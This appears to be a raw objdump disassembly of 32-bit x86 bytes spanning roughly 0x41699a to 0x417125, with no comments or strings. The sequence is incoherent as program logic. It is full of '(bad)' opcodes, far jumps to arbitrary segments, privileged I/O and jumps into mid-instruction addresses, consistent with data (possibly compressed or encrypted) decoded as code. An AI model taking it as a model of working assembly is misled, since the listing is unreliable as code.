  41699a:	xor    edi,DWORD PTR [esi-0x2eb467d0]
  4169a0:	call   0x2eab:0xac6b7c55
  4169a7:	jmp    0x41692d
  4169a9:	mov    bh,0x1d
  4169ab:	mov    bh,0x2c
  4169ad:	cmp    dh,al
  4169af:	fld    DWORD PTR [edi+0x21]
  4169b2:	and    edi,ecx
  4169b4:	and    esp,ebx
  4169b6:	inc    esi
  4169b7:	mov    ah,0xc3
  4169b9:	pop    edi
  4169ba:	sbb    ebp,esi
  4169bc:	dec    esp
  4169bd:	gs pop es
  4169bf:	adc    al,0xda
  4169c1:	xchg   BYTE PTR [ebp+0x6cea38d0],cl
  4169c7:	ret    0x4d47
  4169ca:	pop    ebp
  4169cb:	mov    ds:0xb6fd8448,eax
  4169d0:	rcl    DWORD PTR ds:0x5a080e73,0xbf
  4169d7:	lahf   
  4169d8:	adc    DWORD PTR [ebp-0x55aa5c38],ecx
  4169de:	popf   
  4169df:	(bad)  
  4169e0:	sub    ebp,DWORD PTR [edx+0x23]
  4169e3:	dec    ecx
  4169e4:	imul   ebp,esi,0x63
  4169e7:	fsub   QWORD PTR [edx-0x26]
  4169ea:	cmp    edi,esi
  4169ec:	or     DWORD PTR [edi+0x41],ebx
  4169ef:	push   sp
  4169f1:	jg     0x4169aa
  4169f3:	enter  0x83cb,0x2b
  4169f7:	popf   
  4169f8:	adc    ebp,ebp
  4169fa:	ja     0x416a75
  4169fc:	sti    
  4169fd:	loop   0x416a40
  4169ff:	mov    bh,0x85
  416a01:	sub    BYTE PTR [eax],bh
  416a03:	cmp    dh,ch
  416a05:	or     al,0x36
  416a07:	xchg   ebp,eax
  416a08:	outs   dx,DWORD PTR ds:[esi]
  416a09:	sbb    al,0xba
  416a0b:	daa    
  416a0c:	test   DWORD PTR [esi+0x7a8b9fc6],esp
  416a12:	arpl   WORD PTR [edx+eax*2-0x55],dx
  416a16:	pop    edx
  416a17:	std    
  416a18:	push   0x5320090e
  416a1d:	call   0xdd9:0xb2d53276
  416a24:	cwde   
  416a25:	sar    dl,0xd3
  416a28:	xchg   edx,eax
  416a29:	lea    esp,[edx-0x4f16a35b]
  416a2f:	lock dec ebp
  416a31:	and    eax,0x56a4f655
  416a36:	loope  0x416ab4
  416a38:	ds int3 
  416a3a:	aam    0x96
  416a3c:	popf   
  416a3d:	lods   al,BYTE PTR ds:[esi]
  416a3e:	outs   dx,BYTE PTR ds:[esi]
  416a3f:	test   BYTE PTR [esi+0x6c],al
  416a42:	test   bh,cl
  416a44:	or     eax,0x72890bd1
  416a49:	retf   0xc2b5
  416a4c:	xor    DWORD PTR [ebx-0x16],ebx
  416a4f:	ficom  DWORD PTR [ecx+0x37839daa]
  416a55:	and    DWORD PTR [ecx+0x1872ecb2],eax
  416a5b:	jecxz  0x416a3e
  416a5d:	inc    edi
  416a5e:	dec    eax
  416a5f:	pusha  
  416a60:	jo     0x416aa9
  416a62:	stos   BYTE PTR es:[edi],al
  416a63:	xchg   esi,eax
  416a64:	push   ss
  416a65:	ret    0x84f0
  416a68:	scas   al,BYTE PTR es:[edi]
  416a69:	lods   al,BYTE PTR ds:[esi]
  416a6a:	jns    0x4169f1
  416a6c:	inc    ebx
  416a6d:	mov    edx,DWORD PTR [esi-0x1d]
  416a70:	jnp    0x416a96
  416a72:	mov    edi,DWORD PTR [ecx]
  416a74:	mov    ecx,ebp
  416a76:	scas   al,BYTE PTR es:[edi]
  416a77:	lods   eax,DWORD PTR ds:[esi]
  416a78:	fwait
  416a79:	dec    ecx
  416a7a:	pop    esp
  416a7b:	sub    ebp,DWORD PTR [ebx+0x5d]
  416a7e:	sbb    cl,ah
  416a80:	jecxz  0x416aa9
  416a82:	mov    ds:0xbedf77a1,al
  416a87:	es sbb eax,0xd0f88af
  416a8d:	inc    BYTE PTR [edx+0x44]
  416a90:	loope  0x416a54
  416a92:	iret   
  416a93:	adc    DWORD PTR [eax-0x7b],edx
  416a96:	cmp    BYTE PTR [edi-0x2d76d7d],al
  416a9c:	cmp    DWORD PTR [edi],esi
  416a9e:	adc    al,BYTE PTR [eax-0x42856d25]
  416aa4:	enter  0x1e08,0xba
  416aa8:	dec    eax
  416aa9:	je     0x416a30
  416aab:	enter  0x81c4,0x69
  416aaf:	cdq    
  416ab0:	aas    
  416ab1:	sti    
  416ab2:	shl    ah,1
  416ab4:	mov    WORD PTR [edi],?
  416ab6:	or     cl,ah
  416ab8:	shl    ebp,0x5c
  416abb:	fldcw  WORD PTR gs:[edx+0x52]
  416abf:	fstp   st(6)
  416ac1:	lock xchg ecx,eax
  416ac3:	jl     0x416a9f
  416ac5:	adc    eax,0x2b7ab542
  416aca:	outs   dx,BYTE PTR ds:[esi]
  416acb:	jnp    0x416ade
  416acd:	or     DWORD PTR [edi+ebp*8+0x75],edx
  416ad1:	mov    ds:0x3415e365,eax
  416ad6:	lods   eax,DWORD PTR ds:[esi]
  416ad7:	frstor [ecx+0x7b]
  416ada:	cmp    eax,0x45ce464
  416adf:	mov    ds:0x360e3785,al
  416ae4:	stos   DWORD PTR es:[edi],eax
  416ae5:	mov    edi,0x6878cf66
  416aea:	outs   dx,BYTE PTR ds:[esi]
  416aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aec:	or     BYTE PTR [ebx-0x4b385f98],0xd2
  416af3:	call   0x3fe65d
  416af8:	adc    BYTE PTR [edi],0xb4
  416afb:	or     BYTE PTR [edi-0x68],0x42
  416aff:	jne    0x416a9c
  416b01:	call   0xcdc2c215
  416b06:	cmp    eax,0xe1aa0b27
  416b0b:	dec    ecx
  416b0c:	call   0xb2a3:0x4b2a93fa
  416b13:	xchg   ebx,eax
  416b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b15:	mov    cl,0x6b
  416b17:	sbb    esi,edx
  416b19:	jnp    0x416b98
  416b1b:	data16 jo 0x416ab6
  416b1e:	mov    esp,0x2f199d5e
  416b23:	or     al,0xd3
  416b25:	xor    esi,DWORD PTR [ebx-0x53]
  416b28:	jp     0x416add
  416b2a:	or     DWORD PTR [eax-0x22],esp
  416b2d:	jle    0x416aea
  416b2f:	xchg   ebp,eax
  416b30:	dec    edx
  416b31:	mov    edx,0x7c72abc4
  416b36:	push   eax
  416b37:	dec    edx
  416b38:	push   0xec5f237a
  416b3d:	push   es
  416b3e:	pop    ds
  416b3f:	loop   0x416b99
  416b41:	dec    esi
  416b42:	inc    edx
  416b43:	and    ebp,0x49
  416b46:	jne    0x416b7f
  416b48:	xchg   edi,eax
  416b49:	push   0x5
  416b4b:	inc    ecx
  416b4c:	pop    esp
  416b4d:	pop    edx
  416b4e:	jae    0x416b75
  416b50:	retf   
  416b51:	idiv   DWORD PTR [edx]
  416b53:	clc    
  416b54:	sar    DWORD PTR [ecx-0xe],cl
  416b57:	and    DWORD PTR [ebp-0x1d22b4ee],edi
  416b5d:	jle    0x416b1d
  416b5f:	ficomp DWORD PTR [esi]
  416b61:	xor    eax,0xb0e9ba04
  416b66:	ins    BYTE PTR es:[edi],dx
  416b67:	ret    
  416b68:	xchg   edi,eax
  416b69:	fdivr  st,st(0)
  416b6b:	mov    ds:0x7bbe73d8,al
  416b70:	shl    bh,0xd6
  416b73:	mov    bh,0xca
  416b75:	popa   
  416b76:	or     bh,BYTE PTR [ebx-0x25d4993]
  416b7c:	(bad)  
  416b7e:	mov    ds:0x4ca34023,eax
  416b83:	pop    es
  416b84:	mov    dh,0xa0
  416b86:	jecxz  0x416bbd
  416b88:	ret    
  416b89:	push   eax
  416b8a:	fiadd  WORD PTR [edi-0x18a16f9d]
  416b90:	sub    DWORD PTR [eax-0x7c],ebx
  416b93:	jae    0x416b5e
  416b95:	popf   
  416b96:	(bad)  
  416b97:	sub    DWORD PTR [esi+0x17ba5a2d],edi
  416b9d:	shl    BYTE PTR [edi+0x2f],cl
  416ba0:	aaa    
  416ba1:	fild   WORD PTR [edx+0x6a305dd7]
  416ba7:	lods   al,BYTE PTR ds:[esi]
  416ba8:	not    BYTE PTR [edx+0x66]
  416bab:	mov    WORD PTR [ebx+eax*1+0x26],?
  416baf:	loope  0x416c1a
  416bb1:	dec    eax
  416bb2:	mov    bl,0xba
  416bb4:	mov    ah,0x8d
  416bb6:	jg     0x416b50
  416bb8:	xchg   edx,eax
  416bb9:	cmp    eax,0xf5677344
  416bbe:	jg     0x416c39
  416bc0:	sbb    ch,BYTE PTR [edx+0x7e4debd4]
  416bc6:	jmp    0x4469:0xe320cea5
  416bcd:	in     al,dx
  416bce:	or     ecx,DWORD PTR [esi-0x14]
  416bd1:	fild   DWORD PTR [edi+0x7]
  416bd4:	adc    BYTE PTR [eax],dl
  416bd6:	test   edx,esp
  416bd8:	popa   
  416bd9:	mov    bh,0x1e
  416bdb:	adc    al,0x93
  416bdd:	mov    edx,0x97681302
  416be2:	sub    BYTE PTR [edi-0x563aa97a],dh
  416be8:	push   eax
  416be9:	das    
  416bea:	push   0xffffffad
  416bec:	dec    esp
  416bed:	jae    0x416bcf
  416bef:	(bad)  
  416bf0:	fiadd  DWORD PTR [eax+ecx*8]
  416bf3:	cmc    
  416bf4:	sbb    ebx,eax
  416bf6:	cmp    bh,BYTE PTR es:[esi+0x24]
  416bfa:	add    esi,DWORD PTR [eax]
  416bfc:	aas    
  416bfd:	les    esp,FWORD PTR ss:[ebp+0x7f62c696]
  416c04:	mov    cl,0x92
  416c06:	(bad)  
  416c07:	push   ds
  416c08:	inc    esi
  416c09:	jns    0x416b91
  416c0b:	pop    ds
  416c0c:	loope  0x416beb
  416c0e:	cld    
  416c0f:	mov    ch,0x2f
  416c11:	xchg   ebx,eax
  416c12:	outs   dx,DWORD PTR ds:[esi]
  416c13:	aaa    
  416c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c15:	jb     0x416c6e
  416c17:	add    cl,0xa9
  416c1a:	out    0x40,eax
  416c1c:	dec    edx
  416c1d:	mov    ecx,0x73496502
  416c22:	pop    ds
  416c23:	dec    ebx
  416c24:	cmp    ah,dh
  416c26:	push   0xfca029b0
  416c2b:	sub    eax,0x275b22ff
  416c30:	in     eax,0x71
  416c32:	jle    0x416bf3
  416c34:	nop
  416c35:	aam    0x6
  416c37:	dec    ecx
  416c38:	mov    esi,0x32ad5e92
  416c3d:	adc    al,0x51
  416c3f:	push   0xfffffffb
  416c41:	cmp    edi,DWORD PTR [ecx+0x6546418a]
  416c47:	rcl    esi,cl
  416c49:	stos   DWORD PTR es:[edi],eax
  416c4a:	mov    edi,0x220feff2
  416c4f:	aas    
  416c50:	mov    eax,ds:0xaecc87b5
  416c55:	ficom  DWORD PTR [esi]
  416c57:	pop    esi
  416c58:	xchg   esi,eax
  416c59:	rcr    BYTE PTR [edi-0x61],0xae
  416c5d:	mov    ds:0xb8160983,eax
  416c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c63:	sub    bl,BYTE PTR [eax-0xa89459]
  416c69:	test   bl,bh
  416c6b:	ss call 0xaacf:0x5073a6d0
  416c73:	push   cs
  416c74:	mov    eax,ds:0xf551ed7e
  416c79:	bound  eax,QWORD PTR [edi]
  416c7b:	adc    ecx,esp
  416c7d:	xchg   ecx,eax
  416c7e:	ins    BYTE PTR es:[edi],dx
  416c7f:	ret    
  416c80:	push   ebx
  416c81:	or     al,0x62
  416c83:	sub    DWORD PTR [eax-0x52d64f61],edx
  416c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8a:	xor    dh,BYTE PTR [edx-0x81ba1a5]
  416c90:	into   
  416c91:	pop    esp
  416c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c93:	dec    esi
  416c94:	push   ds
  416c95:	retf   
  416c96:	nop
  416c97:	add    ah,BYTE PTR [ebx+0x61]
  416c9a:	shl    DWORD PTR [ecx+0x6b],1
  416c9d:	dec    eax
  416c9e:	or     eax,0x654279bf
  416ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ca4:	push   edx
  416ca5:	das    
  416ca6:	dec    eax
  416ca7:	pusha  
  416ca8:	xchg   dl,ah
  416caa:	mov    DWORD PTR [ecx],esi
  416cac:	leave  
  416cad:	xlat   BYTE PTR ds:[ebx]
  416cae:	push   ecx
  416caf:	dec    edx
  416cb0:	ret    0x75db
  416cb3:	and    al,0x5e
  416cb6:	ins    BYTE PTR es:[edi],dx
  416cb7:	clc    
  416cb8:	xchg   esi,eax
  416cb9:	fistp  WORD PTR [esi]
  416cbb:	hlt    
  416cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbd:	ror    DWORD PTR [ecx+0x73942be4],0xdb
  416cc4:	bound  esp,QWORD PTR [ebx+0xdfc5755]
  416cca:	test   BYTE PTR [eax],ah
  416ccc:	add    al,0xc6
  416cce:	push   0x4d
  416cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cd1:	adc    DWORD PTR [ecx+0x12],edx
  416cd4:	lods   eax,DWORD PTR ds:[esi]
  416cd5:	or     eax,0x3f588d46
  416cda:	fmul   QWORD PTR [edx-0x2717fb40]
  416ce0:	mov    ah,ah
  416ce2:	not    BYTE PTR [ebp-0x2a55afb6]
  416ce8:	mov    al,ds:0x846b30b6
  416ced:	push   ds
  416cee:	retf   
  416cef:	dec    eax
  416cf0:	sub    esp,DWORD PTR [eax]
  416cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf3:	inc    ebx
  416cf4:	stc    
  416cf5:	inc    ebp
  416cf6:	test   al,0x6a
  416cf8:	stos   DWORD PTR es:[edi],eax
  416cf9:	add    al,0xe9
  416cfb:	mov    bh,0xf0
  416cfd:	mov    edx,0xf3ceb0c2
  416d02:	pop    edi
  416d03:	bound  ecx,QWORD PTR [edx+0x44]
  416d06:	jmp    0x416cc1
  416d08:	in     eax,dx
  416d09:	fpatan 
  416d0b:	pusha  
  416d0c:	repnz dec esp
  416d0e:	cmc    
  416d0f:	mov    ds:0x61cff150,al
  416d14:	shr    BYTE PTR [edi+0x26],0x2e
  416d18:	ins    DWORD PTR es:[edi],dx
  416d19:	(bad)  
  416d1b:	or     eax,0xc8e09ffc
  416d20:	add    BYTE PTR fs:[ecx+0x75],bl
  416d24:	into   
  416d25:	pop    esi
  416d26:	in     al,0x87
  416d28:	jecxz  0x416d60
  416d2a:	es scas al,BYTE PTR es:[edi]
  416d2c:	inc    ebx
  416d2d:	jmp    FWORD PTR [edi-0x6af7f5e1]
  416d33:	call   0x4127a730
  416d38:	nop
  416d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d3a:	nop
  416d3b:	outs   dx,BYTE PTR ds:[esi]
  416d3c:	lock fistp DWORD PTR [edi-0x3a]
  416d40:	dec    edx
  416d41:	jns    0x416d81
  416d43:	xor    edx,DWORD PTR [ecx]
  416d45:	daa    
  416d46:	pop    ss
  416d47:	inc    eax
  416d48:	xchg   edx,eax
  416d49:	retf   
  416d4a:	imul   BYTE PTR [ecx+edx*4]
  416d4d:	aas    
  416d4e:	mov    dl,0xb8
  416d50:	xchg   esp,eax
  416d51:	shl    bh,1
  416d53:	mov    bh,0xca
  416d55:	(bad)  
  416d56:	idiv   dl
  416d58:	add    cx,WORD PTR [edx+0x19]
  416d5c:	rcl    BYTE PTR [eax],1
  416d5e:	mov    edx,0x36533dfb
  416d63:	push   ebp
  416d64:	push   esp
  416d65:	arpl   WORD PTR ds:0xce507b78,cx
  416d6b:	inc    ebx
  416d6c:	xchg   ebp,eax
  416d6d:	leave  
  416d6e:	loopne 0x416d7d
  416d70:	popf   
  416d71:	(bad)  
  416d72:	sbb    esi,DWORD PTR [edx+ebx*2-0x19]
  416d76:	sub    ebp,eax
  416d78:	cmp    esi,ebx
  416d7a:	ror    BYTE PTR [ecx+0x4f],cl
  416d7d:	dec    ebx
  416d7e:	jecxz  0x416d39
  416d80:	xor    al,0x70
  416d82:	repnz mov bh,0x84
  416d85:	inc    ebx
  416d86:	popf   
  416d87:	(bad)  
  416d88:	(bad)  
  416d89:	adc    eax,0xb41fd386
  416d8e:	mov    dl,0x6a
  416d90:	cli    
  416d91:	jmp    FWORD PTR [ecx+0x59]
  416d94:	popa   
  416d95:	out    dx,al
  416d96:	je     0x416d3f
  416d98:	fadd   QWORD PTR [edx-0x75]
  416d9b:	cdq    
  416d9c:	rcr    DWORD PTR ds:[edx],0xcb
  416da0:	push   esi
  416da1:	jae    0x416d3c
  416da3:	clc    
  416da4:	xchg   edx,eax
  416da5:	xchg   DWORD PTR [edi-0x2853271a],esp
  416dab:	ficom  WORD PTR [ebx+0x3c690e28]
  416db1:	pop    es
  416db2:	mov    ss,WORD PTR [esi+0x36]
  416db5:	les    esi,FWORD PTR [ecx]
  416db7:	jae    0x416d78
  416db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dba:	test   eax,0x46a18c65
  416dbf:	mov    cl,0xb8
  416dc1:	test   al,0x82
  416dc3:	icebp  
  416dc4:	cmp    al,0x42
  416dc6:	adc    edx,DWORD PTR [esi-0x4563ff01]
  416dcc:	int    0x3
  416dce:	loop   0x416d9c
  416dd0:	rcr    BYTE PTR [edx],0x52
  416dd3:	pop    ecx
  416dd4:	int3   
  416dd5:	mov    WORD PTR [ebx+0x5fdbcfee],cs
  416ddb:	xchg   edx,eax
  416ddc:	test   al,0xd7
  416dde:	pop    es
  416ddf:	aam    0x5b
  416de1:	popa   
  416de2:	mov    eax,ds:0x4fe174c9
  416de7:	and    esp,edx
  416de9:	xor    DWORD PTR [edi+0x3f],ebp
  416dec:	loope  0x416da6
  416dee:	pop    es
  416def:	inc    eax
  416df0:	inc    ecx
  416df1:	repnz or eax,0xbad50e8c
  416df7:	inc    edi
  416df8:	loopne 0x416d9d
  416dfa:	and    al,0xf2
  416dfc:	pop    eax
  416dfd:	cmp    edi,DWORD PTR [ebp-0x67b52b7f]
  416e03:	test   BYTE PTR [ebp+0x2a4717ff],ch
  416e09:	fsub   DWORD PTR [ebp+0x3d]
  416e0c:	lods   eax,DWORD PTR ds:[esi]
  416e0d:	and    eax,0xafd0e1dd
  416e12:	mov    bh,BYTE PTR [edi-0x21]
  416e15:	mov    al,0x44
  416e17:	xor    eax,DWORD PTR [ebx-0x5d763d15]
  416e1d:	std    
  416e1e:	rol    DWORD PTR [ebp+0x75],cl
  416e21:	add    eax,0xa349967
  416e26:	int    0xfa
  416e28:	xchg   DWORD PTR [eax-0x46],ebp
  416e2b:	std    
  416e2c:	out    dx,al
  416e2d:	pop    ecx
  416e2e:	ficom  WORD PTR [edi-0x3618930c]
  416e34:	jae    0x416de8
  416e36:	or     al,0xb2
  416e38:	scas   al,BYTE PTR es:[edi]
  416e39:	and    al,0x6a
  416e3b:	loopne 0x416dfc
  416e3d:	jo     0x416de8
  416e3f:	jnp    0x416eb1
  416e41:	jg     0x416e58
  416e43:	pop    edx
  416e44:	out    dx,al
  416e45:	arpl   WORD PTR [edx-0x203812cb],dx
  416e4b:	test   eax,0xb9aef9a7
  416e50:	cmp    eax,0x25364e57
  416e55:	adc    eax,0x32eed10c
  416e5a:	jp     0x416e58
  416e5c:	(bad)  [eax+0x30984b37]
  416e62:	aaa    
  416e63:	xchg   esp,eax
  416e64:	dec    ecx
  416e65:	inc    esp
  416e66:	mov    cl,al
  416e68:	sub    BYTE PTR [ebx],dl
  416e6a:	nop
  416e6b:	ds xor dh,ch
  416e6e:	cmp    edx,DWORD PTR [edi-0x7e]
  416e71:	or     al,0x7a
  416e73:	xchg   BYTE PTR [ebp-0x6d5adb4d],bh
  416e79:	adc    DWORD PTR [edi+0x695fbd43],ebp
  416e7f:	xchg   esi,eax
  416e80:	cmp    esp,DWORD PTR [ebp-0x40]
  416e83:	fs out 0x9d,al
  416e86:	mov    WORD PTR [ebx+0x2d],?
  416e89:	pop    DWORD PTR [ecx+ebx*4+0x78a00761]
  416e90:	enter  0xed4c,0x24
  416e94:	test   eax,0x63d2aeb0
  416e99:	icebp  
  416e9a:	pop    ebx
  416e9b:	xchg   edx,eax
  416e9c:	push   edi
  416e9d:	adc    dl,ch
  416e9f:	jmp    0x416e90
  416ea1:	scas   al,BYTE PTR es:[edi]
  416ea2:	repz fadd st,st(2)
  416ea5:	retf   
  416ea6:	pop    edi
  416ea7:	sbb    dh,dh
  416ea9:	popa   
  416eaa:	ret    
  416eab:	push   es
  416eac:	sub    al,BYTE PTR [ecx+eiz*1-0x45fc22a6]
  416eb3:	stos   BYTE PTR es:[edi],al
  416eb4:	popf   
  416eb5:	loop   0x416e6f
  416eb7:	mov    gs,eax
  416eb9:	daa    
  416eba:	inc    esp
  416ebb:	jmp    0x2c38774a
  416ec0:	mov    ds:0xbd69c969,al
  416ec5:	mov    WORD PTR fs:[ecx+0x66721d2d],?
  416ecc:	adc    al,0x66
  416ece:	(bad)  
  416ecf:	lods   al,BYTE PTR ds:[esi]
  416ed0:	fsub   QWORD PTR [esp+ebp*2-0x565550fd]
  416ed7:	ror    BYTE PTR [edx-0x6a978fa4],1
  416edd:	mov    dh,0x18
  416edf:	push   esp
  416ee0:	fbld   TBYTE PTR [ebp+0x4a]
  416ee3:	push   es
  416ee4:	int3   
  416ee5:	fs and al,0xd4
  416ee8:	or     DWORD PTR [edx+0x8],esp
  416eeb:	div    BYTE PTR [edx+0x2ce64da7]
  416ef1:	retf   
  416ef2:	cwde   
  416ef3:	in     al,dx
  416ef4:	sub    DWORD PTR [ebp+0x19],0xfffffffd
  416ef8:	(bad)
  416efc:	mov    ebx,0xcc07dbb5
  416f01:	test   DWORD PTR [edi+eax*8-0x6e],ebp
  416f05:	dec    edx
  416f06:	mul    BYTE PTR [edi+0x72]
  416f09:	sbb    eax,0x747d37bd
  416f0e:	jmp    0xf5a44fb7
  416f13:	aas    
  416f14:	stos   BYTE PTR es:[edi],al
  416f15:	jge    0x416f20
  416f17:	imul   eax,DWORD PTR [edx+0x50b5281],0x808aba3d
  416f21:	aad    0xe1
  416f23:	mov    ch,0x79
  416f25:	add    al,BYTE PTR [ebx-0x3c]
  416f28:	xor    ecx,0x70
  416f2b:	xchg   ecx,edi
  416f2d:	xchg   ebp,eax
  416f2e:	(bad)  
  416f2f:	mov    edi,0xb2dfc00
  416f34:	test   dl,dl
  416f36:	das    
  416f37:	sub    ch,BYTE PTR [ebx]
  416f39:	cld    
  416f3a:	and    DWORD PTR [bx+di-0x2b86],esi
  416f3f:	inc    edx
  416f40:	push   edi
  416f41:	jecxz  0x416f6c
  416f43:	lea    ebx,[eax-0x13]
  416f46:	pushf  
  416f47:	sbb    ebp,DWORD PTR [ecx+0x1abae3f6]
  416f4d:	cmp    al,0xa5
  416f4f:	fs (bad) 
  416f51:	push   edi
  416f52:	lea    edi,[esi]
  416f54:	fwait
  416f55:	sbb    bl,BYTE PTR [edi-0x1a]
  416f58:	ins    BYTE PTR es:[edi],dx
  416f59:	and    dh,bl
  416f5b:	or     edi,edi
  416f5d:	in     eax,0xfd
  416f5f:	pop    ds
  416f60:	push   esi
  416f61:	das    
  416f62:	pop    ds
  416f63:	xchg   esp,eax
  416f64:	mul    esp
  416f66:	cmp    BYTE PTR [esi],0x38
  416f69:	cdq    
  416f6a:	xchg   edi,eax
  416f6b:	dec    esi
  416f6c:	aaa    
  416f6d:	xor    eax,0xc29c28fa
  416f72:	rol    DWORD PTR [ecx],1
  416f74:	add    ch,BYTE PTR [ecx+0x1179ab92]
  416f7a:	push   edi
  416f7b:	mov    ch,0x2
  416f7d:	in     eax,dx
  416f7e:	mov    eax,0xf4cb6e3b
  416f83:	push   es
  416f84:	rcr    DWORD PTR [ebp-0x62],0xfa
  416f88:	fucomi st,st(0)
  416f8a:	fnstcw WORD PTR [esi-0x58466110]
  416f90:	aas    
  416f91:	(bad)  
  416f92:	into   
  416f93:	push   cs
  416f94:	cli    
  416f95:	inc    ecx
  416f96:	mov    al,0x82
  416f98:	dec    esp
  416f99:	in     eax,0x2
  416f9b:	call   FWORD PTR [ecx-0x3a]
  416f9e:	inc    ebx
  416f9f:	mov    dl,0x88
  416fa1:	mov    al,ds:0x35c03212
  416fa6:	cmc    
  416fa7:	or     dh,al
  416fa9:	mov    BYTE PTR [edi-0x8],ah
  416fac:	enter  0x30e9,0xba
  416fb0:	mov    ah,dl
  416fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb3:	push   cs
  416fb4:	fild   QWORD PTR [edx-0x46]
  416fb7:	jmp    0x416f63
  416fb9:	cmp    DWORD PTR [ebp+eax*8-0x68ec9692],edx
  416fc0:	(bad)  
  416fc1:	(bad)  
  416fc2:	stos   BYTE PTR es:[edi],al
  416fc3:	and    esp,esp
  416fc5:	clc    
  416fc6:	out    0x6d,eax
  416fc8:	or     cl,ah
  416fca:	retf   
  416fcb:	or     ebx,DWORD PTR [ecx+0x3b9ff43e]
  416fd1:	sub    al,0x9a
  416fd3:	push   ebx
  416fd4:	pop    edx
  416fd5:	fst    QWORD PTR [ecx+0x65098a36]
  416fdb:	test   al,0x72
  416fdd:	ret    0xc339
  416fe0:	imul   ebx,DWORD PTR [edx],0x6a82db12
  416fe6:	or     eax,DWORD PTR [eax+0x22]
  416fe9:	mov    BYTE PTR [edx-0x32],al
  416fec:	push   eax
  416fed:	inc    edx
  416fee:	push   0x46
  416ff0:	mov    esi,0x30f60390
  416ff5:	jmp    0x197a:0xbcbf5907
  416ffc:	neg    BYTE PTR [ebx+0x55]
  416fff:	in     al,dx
  417000:	xor    eax,0xdb573dae
  417005:	sbb    ebx,DWORD PTR [esi]
  417007:	xor    esp,DWORD PTR [edx-0xb5a37d0]
  41700d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41700e:	mov    ds,WORD PTR [edx]
  417010:	cmp    BYTE PTR [edx+eax*2-0x3a],bh
  417014:	push   esi
  417015:	add    eax,0x78d3c07b
  41701a:	jmp    0x417019
  41701c:	das    
  41701d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41701e:	sub    dl,BYTE PTR [esi]
  417020:	sbb    dl,BYTE PTR [edi]
  417022:	aas    
  417023:	popa   
  417024:	call   0xdc1b9553
  417029:	inc    edi
  41702a:	out    dx,al
  41702b:	retf   
  41702c:	and    ebx,DWORD PTR [edx]
  41702e:	push   ss
  41702f:	xchg   BYTE PTR ds:[ecx+edi*2],dl
  417033:	jns    0x4170a2
  417035:	xchg   DWORD PTR [ebx-0x29],edx
  417038:	sub    al,0xc7
  41703a:	cmc    
  41703b:	mov    ch,0x9b
  41703d:	and    eax,0x5d919016
  417042:	adc    DWORD PTR [edi-0x16],ecx
  417045:	pop    esp
  417046:	push   ebx
  417047:	out    0x15,al
  417049:	idiv   BYTE PTR [edx+0x6862cc18]
  41704f:	gs (bad) 
  417051:	xor    dh,BYTE PTR [eax-0x6d]
  417054:	and    al,0x24
  417056:	mov    eax,0x11084fb7
  41705b:	in     eax,0xe0
  41705d:	shl    DWORD PTR [edi+0x2f],1
  417060:	dec    ecx
  417061:	fldenv [ecx+0x1d43f438]
  417067:	inc    ecx
  417068:	int    0x36
  41706a:	nop
  41706b:	dec    ebx
  41706c:	es test al,0x38
  41706f:	jns    0x4170e5
  417071:	pop    ds
  417072:	fwait
  417073:	pusha  
  417074:	add    esp,DWORD PTR ds:0xb3eaa05
  41707a:	xor    ah,BYTE PTR [ecx-0x2e]
  41707d:	mov    dl,0x8e
  41707f:	les    ebx,FWORD PTR [ebx+0x29a5f519]
  417085:	push   edi
  417086:	dec    eax
  417087:	sub    eax,0xd9b7990d
  41708c:	xlat   BYTE PTR ds:[ebx]
  41708d:	and    ecx,ebx
  41708f:	adc    ch,0xbc
  417092:	data16 lods al,BYTE PTR ds:[esi]
  417094:	loop   0x41705d
  417096:	gs scas eax,DWORD PTR es:[edi]
  417098:	xor    al,ah
  41709a:	jbe    0x417056
  41709c:	mov    ch,bl
  41709e:	mov    dh,0xe7
  4170a0:	pushf  
  4170a1:	jle    0x417032
  4170a3:	bound  ebx,QWORD PTR [edx+0x31]
  4170a6:	xor    BYTE PTR [ecx],al
  4170a8:	sbb    bh,dl
  4170aa:	mov    ebx,0xc18496f7
  4170af:	je     0x41703b
  4170b1:	cmp    al,0x2
  4170b3:	leave  
  4170b4:	mov    al,BYTE PTR [ebx]
  4170b6:	sub    bh,al
  4170b8:	rcr    BYTE PTR [ecx],1
  4170ba:	add    edx,esp
  4170bc:	mov    DWORD PTR [eax-0x50862cdc],ecx
  4170c2:	popf   
  4170c3:	sub    al,0x5f
  4170c5:	cmp    esi,DWORD PTR [edx-0x64]
  4170c8:	ret    0xd85a
  4170cb:	mov    esi,0xcddc67ca
  4170d0:	jmp    0x798d59e4
  4170d5:	mov    DWORD PTR [ecx+0x7c],esi
  4170d8:	loopne 0x4170b8
  4170da:	outs   dx,DWORD PTR ds:[esi]
  4170db:	es stos BYTE PTR es:[di],al
  4170de:	fimul  DWORD PTR [esi]
  4170e0:	and    BYTE PTR [esi],bl
  4170e2:	ret    
  4170e3:	test   BYTE PTR [ebx+0x4bfd014a],dl
  4170e9:	xchg   ecx,eax
  4170ea:	mov    eax,0x79a144f
  4170ef:	pop    es
  4170f0:	iret   
  4170f1:	mov    ds:0x656792c8,al
  4170f6:	fistp  WORD PTR [esi+0x446a325a]
  4170fc:	iret   
  4170fd:	xor    DWORD PTR [ebp-0x49],0xd1bf2daf
  417104:	xor    DWORD PTR [eax+0x194267e0],ecx
  41710a:	int3   
  41710b:	test   eax,0xd0b9030f
  417110:	fbld   TBYTE PTR [ecx+0x367001c4]
  417116:	add    BYTE PTR [ebx-0xa985cfc],ah
  41711c:	add    al,0x66
  41711e:	div    BYTE PTR [ebx+eiz*2+0xd]
  417122:	jae    0x4170a9
  417124:	dec    ebp
  417125:	sti    
